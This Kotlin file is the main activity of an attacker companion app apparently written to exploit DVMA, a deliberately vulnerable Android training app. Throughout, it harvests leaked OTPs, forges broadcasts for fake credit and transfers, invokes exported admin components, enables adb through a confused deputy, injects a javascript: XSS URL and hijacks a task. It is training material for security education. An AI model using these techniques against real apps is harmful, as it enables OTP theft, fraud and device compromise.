package com.dvma.attacker

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.widget.ScrollView
import android.widget.TextView

/**
 * Minimal UI for the DVMA companion attacker app.
 *
 * FOR AUTHORIZED SECURITY-TRAINING USE ONLY.
 *
 * Starts [OtpHarvestService] (a foreground service that keeps the
 * [OtpLeakReceiver] registered even while DVMA, not this app, is foreground)
 * and shows the latest harvested secret. The real proof is in logcat
 * (`DVMA-ATTACKER`) and the pullable capture file; this screen is just a
 * convenience readout.
 */
class AttackerActivity : Activity() {

    private lateinit var view: TextView
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        AttackerCapture.externalDir = getExternalFilesDir(null)

        view = TextView(this).apply {
            textSize = 14f
            setPadding(32, 64, 32, 32)
            gravity = Gravity.TOP
        }
        setContentView(ScrollView(this).apply { addView(view) })

        val svc = Intent(this, OtpHarvestService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }

        // Optional: the harness can launch this activity with `--es send <kind>`
        // to have the attacker fire a broadcast at DVMA's exported receivers
        // (exported_broadcast_receiver_spoof / dynamic_broadcast_receiver_exposure).
        handleSend(intent)
        refresh()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleSend(intent)
    }

    private fun handleSend(intent: Intent?) {
        when (intent?.getStringExtra("send")) {
            "location" -> BroadcastForger.send(
                this,
                Dvma.ACTION_LOCATION_UPDATE,
                mapOf(
                    "lat" to "40.6892",
                    "lon" to "-74.0445",
                    "label" to "spoofed by com.dvma.attacker",
                ),
            )
            "promo" -> BroadcastForger.send(
                this,
                Dvma.ACTION_APPLY_PROMO,
                mapOf("code" to "ATTACKER100", "credit" to "100.00"),
            )
        }
        // `--es start <component>` starts one of DVMA's exported components.
        when (intent?.getStringExtra("start")) {
            "admin" -> ComponentInvoker.startActivity(this, Dvma.ADMIN_ACTIVITY)
            "url" -> ComponentInvoker.startActivity(
                this,
                Dvma.URL_DISPATCH_ACTIVITY,
                mapOf(
                    "target" to "https://evil.example/attacker",
                    "activity" to "InternalAdminActivity",
                ),
            )
            "state" -> ComponentInvoker.startActivity(
                this,
                Dvma.STATE_CONTROL_ACTIVITY,
                mapOf("notification_id" to "victim-notif-1"),
            )
            "deputy" -> ComponentInvoker.startActivity(
                this,
                Dvma.DEPUTY_ACTIVITY,
                mapOf(
                    "privileged_action" to Dvma.ACTION_WRITE_SECURE_SETTING,
                    "setting" to "adb_enabled=1",
                ),
            )
            "redirect" -> ComponentInvoker.startWithForward(
                this,
                Dvma.PROXY_ACTIVITY,
                Dvma.INTERNAL_ADMIN_ACTIVITY,
            )
            "arg" -> ComponentInvoker.startActivity(
                this,
                Dvma.LAUNCHER_ACTIVITY,
                mapOf("cmd" to "dump_secrets"),
            )
            "alias" -> ComponentInvoker.startActivity(this, Dvma.ADMIN_ALIAS)
            "xss" -> ComponentInvoker.startActivity(
                this,
                Dvma.WEBVIEW_ACTIVITY,
                mapOf("url" to "javascript:document.title='xss-by-attacker'"),
            )
            "chain" -> BroadcastForger.send(
                this,
                Dvma.ACTION_CHAIN_TRIGGER,
                mapOf("amount" to "1000.00", "to" to "attacker-account"),
                Dvma.CHAIN_ENTRY_RECEIVER,
            )
            "hijack" -> {
                // Open DVMA's affinity-bearing screen to create/raise its task,
                // then launch our own activity which reparents into that task.
                ComponentInvoker.startActivity(this, Dvma.HIJACK_TARGET_ACTIVITY)
                startActivity(
                    Intent(this, HijackActivity::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                )
            }
        }
        // `--es bind <service>` binds one of DVMA's exported services.
        when (intent?.getStringExtra("bind")) {
            "service" -> ServiceBinderClient.bindAndHarvest(this)
        }
    }

    override fun onResume() {
        super.onResume()
        tick()
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacksAndMessages(null)
    }

    private fun tick() {
        refresh()
        handler.postDelayed(::tick, 1000)
    }

    private fun refresh() {
        view.text = buildString {
            appendLine("DVMA Attacker - cross-app harvest")
            appendLine("(authorized training use only)")
            appendLine()
            appendLine("Harvest service: running (foreground)")
            appendLine("Listening for:")
            appendLine("  ${OtpLeakReceiver.ACTION_OTP}")
            appendLine()
            appendLine("Latest capture:")
            appendLine("  ${AttackerCapture.last}")
        }
    }
}
